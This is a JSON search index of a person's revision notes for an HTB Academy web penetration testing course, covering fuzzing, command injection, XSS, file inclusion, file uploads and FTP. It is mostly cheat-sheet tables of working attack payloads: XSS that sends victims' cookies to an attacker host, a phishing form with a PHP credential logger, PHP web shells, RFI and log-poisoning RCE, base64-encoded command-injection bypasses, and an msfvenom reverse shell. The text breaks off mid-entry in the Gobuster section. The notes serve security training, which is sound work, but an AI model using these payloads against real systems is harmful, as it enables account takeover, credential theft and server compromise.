{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bug Bounty Hub","text":"<p>Welcome to the Bug Bounty Hub!</p>"},{"location":"#certifications","title":"Certifications","text":"<ul> <li>HTB Certified Web Exploitation Specialist - Revision notes from the Web Penetration Tester course (formally Bug Bounty Hunter course).</li> </ul>"},{"location":"bug-bounty-guide/","title":"Bug Bounty Guide","text":"<p>Revision materials and notes from the HTB Academy Bug Bounty Hunter Course. In October 2025 the course named changed to Web Pentration Tester and the certificate to Certified Web Exploitation Specialist. The following changes were made to the course material</p> Retired Module Replacement Information Gathering - Web Edition Web Fuzzing Session Security Attacking GraphQL Web Service &amp; API Attacks API Attacks Hacking WordPress Attacking Common Applications"},{"location":"bug-bounty-guide/#contents","title":"Contents","text":""},{"location":"bug-bounty-guide/#bug-bounty-hunter-modules","title":"Bug Bounty Hunter Modules","text":"<ul> <li>Web Requests</li> <li>Introduction to Web Applications</li> <li>Using Web Proxies</li> <li>Information Gathering - Web Edition</li> <li>Attacking Web Applications with Ffuf</li> <li>JavaScript Deobfuscation</li> <li>Cross-Site Scripting (XSS)</li> <li>SQL Injection Fundamentals </li> <li>SQLMap Essentials</li> <li>Command Injections</li> <li>File Upload Attacks</li> <li>Server-side Attacks</li> <li>Login Brute Forcing</li> <li>Broken Authentication</li> <li>Web Attacks</li> <li>File Inclusion</li> <li>Session Security</li> <li>Web Service &amp; API Attacks</li> <li>Hacking WordPress</li> <li>Bug Bounty Reporting</li> </ul>"},{"location":"bug-bounty-guide/#new-web-pentration-tester-modules","title":"New Web Pentration Tester Modules","text":"<ul> <li>Web Fuzzing</li> <li>Attacking GraphQL</li> <li>API Attacks</li> <li>Attacking Common Applications</li> </ul>"},{"location":"bug-bounty-guide/#additional-cheat-sheets","title":"Additional Cheat Sheets","text":"<ul> <li>FTP</li> <li>Gobuster</li> </ul>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/","title":"Attacking Web Applications with Ffuf","text":""},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#flags","title":"Flags","text":"Flag Use Example -u Specify target URL -u http://example.com/FUZZ -w Set wordlist file -w wordlist.txt -ic Ignore wordlist comments -ic -H Add custom HTTP headers -H \"Authorization: Bearer token\" -X Set HTTP method -X POST -e Extend wordlist with extensions -e .php,.html -s Enable silent mode -s -v Increase verbosity -v -t Set number of threads -t 50 -k Ignore SSL/TLS errors -k -o Output results to file -o results.txt -timeout Set request timeout in seconds -timeout 30 -recursion Enable recursive directory scanning -recursion -recursion-depth Set maximum recursion depth -recursion-depth 2 -s Filter by status codes -s 200,404 -mc Match by status codes -mc 200 -ml Match by line count -ml 50 -mw Match by word count -mw 100 -ms Match by size in bytes -ms 1024 -fc Filter by status codes -fc 404 -fl Filter by line count -fl 0 -fw Filter by word count -fw 0 -fs Filter by size in bytes -fs 512 -ac Automatically calibrate filtering -ac"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#commands","title":"Commands","text":"Command Description <code>ffuf -h</code> Display ffuf help menu <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing to discover hidden directories <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing to identify file types <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing to find dynamic pages <code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing to enumerate subdomains <code>ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> VHost Fuzzing to detect virtual hosts, filtering by size <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET to find injectable parameters, filter by size <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST to test POST-based parameters <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing to test parameter value vulnerabilities <code>ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing to explore subdirectories with verbose output <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr \"You don't have access!\" -t 100</code> Recursive Fuzzing to explore subdirectories, check for variation of the php extensions, match a specific response, 100 threads <code>ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781</code> Fuzzing the username post parameter and filter response size"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#wordlists","title":"Wordlists","text":"<p>Seclists</p> <p>Create a sequence wordlist for value fuzzing:</p> <pre><code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done\n</code></pre>"},{"location":"bug-bounty-guide/attacking-web-applications-with-ffuf/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP academy.htb\" &gt;&gt; /etc/hosts'</code> Add a DNS entry to resolve custom domains <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> Example curl command with POST request"},{"location":"bug-bounty-guide/broken-authentication/","title":"Broken Authentication","text":""},{"location":"bug-bounty-guide/broken-authentication/#categories-of-authentication","title":"Categories of Authentication","text":"<ul> <li>Knowledge: passwords, PINs, ...</li> <li>Ownership: ID cards, TOTP</li> <li>Inherence: Biometric authentication</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#brute-force-attacks","title":"Brute-Force Attacks","text":"<ul> <li>User Enumeration</li> <li>Brute-Forcing Passwords</li> <li>Brute-Forcing Password Reset Tokens</li> <li>Brute-Forcing 2FA Codes</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#bypassing-brute-force-protection","title":"Bypassing Brute-Force Protection","text":"<ul> <li>Rate Limit: X-Forwarded-For HTTP Header</li> <li>CAPTCHAs: Look for CAPTCHA solution in HTML code</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#password-attacks","title":"Password Attacks","text":"<ul> <li>Default Credentials</li> <li>CIRT.net</li> <li>SecLists Default Credentials</li> <li>SCADA</li> <li>Vulnerable Password Reset</li> <li>Guessable Security Questions</li> <li>Username Injection in Reset Request</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#authentication-bypasses","title":"Authentication Bypasses","text":"<ul> <li>Accessing the protected page directly</li> <li>Manipulating HTTP Parameters to access protected pages</li> </ul>"},{"location":"bug-bounty-guide/broken-authentication/#session-attacks","title":"Session Attacks","text":"<ul> <li>Brute-Forcing cookies with insufficient entropy</li> <li>Session Fixation</li> <li>Attacker obtains valid session identifier</li> <li>Attacker coerces victim to use this session identifier (social engineering)</li> <li>Victim authenticates to the vulnerable web application</li> <li>Attacker knows the victim's session identifier and can hijack their account</li> <li>Improper Session Timeout</li> <li>Sessions should expire after an appropriate time interval</li> <li>Session validity duration depends on the web application</li> </ul>"},{"location":"bug-bounty-guide/bug-bounty-hunting-process/","title":"Bug Bounty Reporting","text":""},{"location":"bug-bounty-guide/command-injections/","title":"Command Injections","text":""},{"location":"bug-bounty-guide/command-injections/#injection-operators","title":"Injection Operators","text":"Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon ; %3b Both New Line \\n %0a Both Background &amp; %26 Both (second output generally shown first) Pipe %7c AND &amp;&amp; %26%26 Both (only if first succeeds) OR Sub-Shell `` %60%60 Both (Linux-only) Sub-Shell $() %24%28%29 Both (Linux-only)"},{"location":"bug-bounty-guide/command-injections/#linux","title":"Linux","text":""},{"location":"bug-bounty-guide/command-injections/#filtered-character-bypass","title":"Filtered Character Bypass","text":"Code Description <code>printenv</code> Can be used to view all environment variables Spaces <code>%09</code> Using tabs instead of spaces <code>${IFS}</code> Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) <code>{ls,-la}</code> Commas will be replaced with spaces Other Characters <code>${PATH:0:1}</code> Will be replaced with / <code>${LS_COLORS:10:1}</code> Will be replaced with ; <code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> Shift character by one ([ -&gt; )"},{"location":"bug-bounty-guide/command-injections/#blacklisted-command-bypass","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>$@ or \\</code> Linux only Case Manipulation <code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")</code> Execute command regardless of cases <code>$(a=\"WhOaMi\";printf %s \"${a,,}\")</code> Another variation of the technique Reversed Commands <code>echo 'whoami' | rev</code> Reverse a string <code>$(rev&lt;&lt;&lt;'imaohw')</code> Execute reversed command Encoded Commands <code>echo -n 'cat /etc/passwd | grep 33' | base64</code> Encode a string with base64 <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/command-injections/#windows","title":"Windows","text":""},{"location":"bug-bounty-guide/command-injections/#filtered-character-bypass_1","title":"Filtered Character Bypass","text":"Code Description <code>Get-ChildItem Env:</code> Can be used to view all environment variables - (PowerShell) Spaces <code>%09</code> Using tabs instead of spaces <code>%PROGRAMFILES:~10,-5%</code> Will be replaced with a space - (CMD) <code>$env:PROGRAMFILES[10]</code> Will be replaced with a space - (PowerShell) Other Characters <code>%HOMEPATH:~0,-17%</code> Will be replaced with \\ - (CMD) <code>$env:HOMEPATH[0]</code> Will be replaced with \\ - (PowerShell)"},{"location":"bug-bounty-guide/command-injections/#blacklisted-command-bypass_1","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>^</code> Windows only (CMD) Case Manipulation <code>WhoAmi</code> Simply send the character with odd cases Reversed Commands <code>\"whoami\"[-1..-20] -join ''</code> Reverse a string <code>iex \"$('imaohw'[-1..-20] -join '')\"</code> Execute reversed command Encoded Commands <code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code> Encode a string with base64 <code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/","title":"Cross-Site Scripting (XSS)","text":""},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#types-of-xss","title":"Types of XSS","text":"<p>There are three main types of XSS vulnerabilities:</p> Type Description Stored (Persistent) XSS Occurs when user input is stored in a database and displayed (e.g., posts). Reflected (Non-Persistent) XSS Occurs when input is processed and shown without storage (e.g., search). DOM-based XSS Occurs when input is client-side processed and displayed (e.g., parameters)."},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-discovery-methods","title":"XSS Discovery Methods","text":"<ul> <li>Nessus</li> <li>Burp Pro</li> <li>ZAP</li> <li>XSS Strike</li> <li>XSSer</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-strike","title":"XSS Strike","text":"<pre><code>git clone https://github.com/s0md3v/XSStrike.git\ncd XSStrike\npip install -r requirements.txt\npython xsstrike.py\npython xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#xss-payloads","title":"XSS Payloads","text":"Code Description <code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> windows.origin shows the URL of the stored XSS if IFrames being used <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> document.cookie shows the cookie of the current page/document <code>&lt;plaintext&gt;</code> Stops the rendoring of any HTML code that comes after <code>&lt;script&gt;print()&lt;/script&gt;</code> Pop up the browser print dialog <code>&lt;img src=\"\" onerror=alert(window.origin)&gt;</code> HTML-based XSS Payload. Use when script tag gets sanitised <code>&lt;script&gt;document.body.style.background = \"#141d2b\"&lt;/script&gt;</code> Change Background Color <code>&lt;script&gt;document.body.background = \"https://www.hackthebox.eu/images/logo-htb.svg\"&lt;/script&gt;</code> Change Background Image <code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code> Change Website Title <code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code> Overwrite website's main body <code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code> Remove certain HTML element <code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;</code> Load remote script <code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code> Send Cookie details to us <ul> <li>PayloadAllTheThings</li> <li>PayloadBox</li> </ul> <p>Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).</p>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#phishing","title":"Phishing","text":"<p>Initial step is to identify a working payload, ie:</p> <pre><code>'&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n</code></pre> <p>Example of a basic HTML login form:</p> <pre><code>&lt;h3&gt;Please login to continue&lt;/h3&gt;\n&lt;form action=http://OUR_IP&gt;\n    &lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;\n    &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;\n    &lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Which can be minified and put into JS:</p> <pre><code>document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');\n</code></pre> <p>To make the new form more likely to succeed, the original page HTML code should be removed:</p> <p>Original code example:</p> <pre><code>&lt;form role=\"form\" action=\"index.php\" method=\"GET\" id='urlform'&gt;\n    &lt;input type=\"text\" placeholder=\"Image URL\" name=\"url\"&gt;\n&lt;/form&gt;\n</code></pre> <p>Removal code:</p> <pre><code>document.getElementById('urlform').remove()\n</code></pre> <p>Adding a comment tag to the end of the payload will remove any remaining code after the exploit form:</p> <pre><code>...PAYLOAD... &lt;!-- \n</code></pre> <p>Complete injection code:</p> <pre><code>'&gt;&lt;script&gt;document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://PWNIP:PWNPO&gt;&lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;');document.getElementById('urlform').remove();&lt;/script&gt;&lt;!--\n</code></pre> <p>The payload should then be added to the URL parameter, encoded, and sent to the victim:</p> <pre><code>http://PWNIP/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2FPWNIP%3APWNPO%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--\n</code></pre> <p>We can then use a basic PHP listener that will retrieve the creds and send the victim to the origin page, simulating a successful login:</p> <p>index.php</p> <pre><code>&lt;?php\nif (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {\n    $file = fopen(\"creds.txt\", \"a+\");\n    fputs($file, \"Username: {$_GET['username']} | Password: {$_GET['password']}\\n\");\n    header(\"Location: http://SERVER_IP/phishing/index.php\");\n    fclose($file);\n    exit();\n}\n?&gt;\n</code></pre> <pre><code>mkdir /tmp/tmpserver\ncd /tmp/tmpserver\nvim index.php #write index.php to file here\nsudo php -S 0.0.0.0:8080\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#blind-xss-detection","title":"Blind XSS detection","text":"<p>Occur with forms only accessible by certain user:</p> <ul> <li>Contact Forms</li> <li>Reviews</li> <li>User Details</li> <li>Support Tickets</li> <li>HTTP User-Agent header</li> </ul> <p>We can detect the presence of blind XSS by starting a netcat listener or php server and entering a script that calls to it:</p> <pre><code>&lt;script src=\"http://OUR_IP/script.js\"&gt;&lt;/script&gt;\n</code></pre> <p>If the form has multiple fields we would detect which field is vulnerable like so:</p> <pre><code>&lt;script src=http://OUR_IP/fullname&gt;&lt;/script&gt; #Used in the fullname field\n&lt;script src=http://OUR_IP/username&gt;&lt;/script&gt; #Used in the username field\n</code></pre> <p>Tip: Email maybe validated on the front-end and back-end, thus is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext.</p> <p>We made need to try multiple payload types, one at a time and appending each field name:</p> <pre><code>&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n'&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\n\"&gt;&lt;script src=http://OUR_IP&gt;&lt;/script&gt;\njavascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://OUR_IP\\';document.body.appendChild(a)')\n&lt;script&gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//OUR_IP\");a.send();&lt;/script&gt;\n&lt;script&gt;$.getScript(\"http://OUR_IP\")&lt;/script&gt;\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#session-hijaking","title":"Session hijaking","text":"<p>If we successfully find a blind XSS vulnerability we can attempt a session hijaking attack.</p> <p>Create two files:</p> <p>script.js</p> <pre><code>new Image().src='http://PWNIP:PWNPO/index.php?c='+document.cookie;\n</code></pre> <p>index.php</p> <pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>Start a php server:</p> <pre><code>php -S 0.0.0.0:PWNPO\n</code></pre> <p>Use identified exploit to call script.js, ie:</p> <pre><code>\"&gt;&lt;script src=http://PWNIP:PWNPO/script.js&gt;&lt;/script&gt;\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#useful-commands","title":"Useful Commands","text":"Command Description <code>python xsstrike.py -u \"http://SERVER_IP:PORT/index.php?task=test\"</code> Run xsstrike on a url parameter <code>sudo nc -lvnp 8080</code> Start netcat listener <code>sudo php -S 0.0.0.0:8080</code> Start PHP server <p>Use cat to write to files:</p> <pre><code>cat &lt;&lt; 'EOF' &gt; script.js\nnew Image().src='http://10.10.14.41:9001/index.php?c=' + document.cookie;\nEOF\n</code></pre>"},{"location":"bug-bounty-guide/cross-site-scripting-%28xss%29/#useful-links","title":"Useful Links","text":"<ul> <li>OWASP XSS</li> <li>XSS Filter Evasion Cheat Sheet</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion/","title":"File Inclusion","text":""},{"location":"bug-bounty-guide/file-inclusion/#local-file-inclusion","title":"Local File Inclusion","text":"Command Description Basic LFI <code>/index.php?language=/etc/passwd</code> Basic LFI <code>/index.php?language=../../../../etc/passwd</code> LFI with path traversal <code>/index.php?language=/../../../etc/passwd</code> LFI with name prefix <code>/index.php?language=./languages/../../../../etc/passwd</code> LFI with approved path LFI Bypasses <code>/index.php?language=....//....//....//....//etc/passwd</code> Bypass basic path traversal filter <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> Bypass filters with URL encoding <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code> Bypass appended extension with path truncation (obsolete) <code>/index.php?language=../../../../etc/passwd%00</code> Bypass appended extension with null byte (obsolete) <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code> Read PHP with base64 filter"},{"location":"bug-bounty-guide/file-inclusion/#remote-code-execution","title":"Remote Code Execution","text":"Command Description PHP Wrappers <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code> RCE with data wrapper <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"</code> RCE with input wrapper <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"</code> RCE with expect wrapper RFI <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code> Host web shell <code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code> Include remote PHP web shell LFI + Upload <code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code> Create malicious image <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code> RCE with malicious uploaded image <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code> Create malicious zip archive 'as jpg' <code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code> RCE with malicious uploaded zip <code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code> Create malicious phar 'as jpg' <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code> RCE with malicious uploaded phar Log Poisoning <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> Read PHP session parameters <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> Poison PHP session with web shell <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code> RCE through poisoned PHP session <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code> Poison server log <code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code> RCE through poisoned PHP session"},{"location":"bug-bounty-guide/file-inclusion/#misc","title":"Misc","text":"Command Description <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code> Fuzz page parameters <code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code> Fuzz LFI payloads <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code> Fuzz webroot path <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code> Fuzz server configurations"},{"location":"bug-bounty-guide/file-inclusion/#lfi-wordlists","title":"LFI Wordlists","text":"<ul> <li>LFI-Jhaddix.txt</li> <li>Webroot path wordlist for Linux</li> <li>Webroot path wordlist for Windows</li> <li>Server configurations wordlist for Linux</li> <li>Server configurations wordlist for Windows</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion/#file-inclusion-functions","title":"File Inclusion Functions","text":"Function Read Content Execute Remote URL PHP <code>include()/include_once()</code> Yes Yes Yes <code>require()/require_once()</code> Yes Yes No <code>file_get_contents()</code> Yes No Yes <code>fopen()/file()</code> Yes No No NodeJS <code>fs.readFile()</code> Yes No No <code>fs.sendFile()</code> Yes No No <code>res.render()</code> Yes Yes No Java <code>include</code> Yes No No <code>import</code> Yes Yes Yes .NET <code>@Html.Partial()</code> Yes No No <code>@Html.RemotePartial()</code> Yes No Yes <code>Response.WriteFile()</code> Yes No No <code>include</code> Yes Yes Yes"},{"location":"bug-bounty-guide/file-upload-attacks/","title":"File Upload Attacks","text":""},{"location":"bug-bounty-guide/file-upload-attacks/#web-shells","title":"Web Shells","text":"Web Shell Description <code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code> Basic PHP File Read <code>&lt;?php system('hostname'); ?&gt;</code> Basic PHP Command Execution <code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code> Basic PHP Web Shell <code>&lt;% eval request('cmd') %&gt;</code> Basic ASP Web Shell <code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code> Generate PHP reverse shell PHP Web Shell PHP Web Shell PHP Reverse Shell PHP Reverse Shell Web/Reverse Shells List of Web Shells and Reverse Shells"},{"location":"bug-bounty-guide/file-upload-attacks/#bypasses","title":"Bypasses","text":"Command Description Client-Side Bypass <code>[CTRL+SHIFT+C]</code> Toggle Page Inspector Blacklist Bypass <code>shell.phtml</code> Uncommon Extension <code>shell.pHp</code> Case Manipulation PHP Extensions List of PHP Extensions ASP Extensions List of ASP Extensions Web Extensions List of Web Extensions Whitelist Bypass <code>shell.jpg.php</code> Double Extension <code>shell.php.jpg</code> Reverse Double Extension <code>%20, %0a, %00, %0d0a, /, .\\, ., \u2026</code> Character Injection - Before/After Extension Content/Type Bypass Content-Types List of All Content-Types File Signatures List of File Signatures/Magic Bytes"},{"location":"bug-bounty-guide/file-upload-attacks/#limited-uploads","title":"Limited Uploads","text":"Potential Attack File Types XSS HTML, JS, SVG, GIF XXE/SSRF XML, SVG, PDF, PPT, DOC DoS ZIP, JPG, PNG"},{"location":"bug-bounty-guide/ftp-cheat/","title":"FTP Cheat Sheet","text":""},{"location":"bug-bounty-guide/ftp-cheat/#overview","title":"Overview","text":"<p>FTP (File Transfer Protocol) is used to transfer files between a client and server. In bug bounty hunting, it can be leveraged for reconnaissance (e.g., discovering open FTP servers), exploitation (e.g., uploading malicious files), or data exfiltration.</p>"},{"location":"bug-bounty-guide/ftp-cheat/#basic-commands","title":"Basic Commands","text":"Command Description Example <code>ftp &lt;hostname&gt;</code> Connect to an FTP server <code>ftp ftp.example.com</code> <code>open &lt;hostname&gt; &lt;port&gt;</code> Open a connection to a specific host and port <code>open ftp.example.com 21</code> <code>user &lt;username&gt; &lt;password&gt;</code> Log in with username and password <code>user admin password123</code> <code>anonymous</code> Attempt anonymous login (no credentials) <code>anonymous</code> <code>ls</code> or <code>dir</code> List files in the current directory <code>ls</code> <code>cd &lt;directory&gt;</code> Change to a specified directory <code>cd /public</code> <code>get &lt;filename&gt;</code> Download a file from the server <code>get sensitive.txt</code> <code>put &lt;filename&gt;</code> Upload a file to the server <code>put shell.php</code> <code>binary</code> Switch to binary mode for non-text files <code>binary</code> <code>ascii</code> Switch to ASCII mode for text files <code>ascii</code> <code>bye</code> or <code>quit</code> Disconnect from the FTP server <code>bye</code>"},{"location":"bug-bounty-guide/ftp-cheat/#commonly-used-flags","title":"Commonly Used Flags","text":"Flag Purpose <code>-v</code> Verbose output, showing detailed connection and transfer info. <code>-i</code> Turns off interactive prompting during multiple file transfers. <code>-n</code> Disables auto-login upon initial connection. <code>-p</code> Enables passive mode to traverse firewalls (e.g., <code>ftp -p ftp.example.com</code>)."},{"location":"bug-bounty-guide/ftp-cheat/#exploitation-tips","title":"Exploitation Tips","text":"<ul> <li>Anonymous Access: Test <code>anonymous</code> login to upload files or exfiltrate data if permitted (username: anonymous and password: user@domain.com when prompted).</li> <li>Brute Forcing: Use tools like Hydra (<code>hydra -l user -P pass.txt ftp://ftp.example.com</code>) to guess credentials.</li> <li>File Upload: Upload malicious scripts (e.g., PHP shells) if write access is granted.</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/","title":"Gobuster Cheat Sheet","text":""},{"location":"bug-bounty-guide/gobuster-cheat/#overview","title":"Overview","text":"<p>Gobuster is a fast and flexible tool for brute-forcing directories, files, DNS names, and virtual hosts, widely used in bug bounty reconnaissance.</p>"},{"location":"bug-bounty-guide/gobuster-cheat/#basic-commands","title":"Basic Commands","text":"Command Description Example <code>gobuster dir -u &lt;url&gt; -w 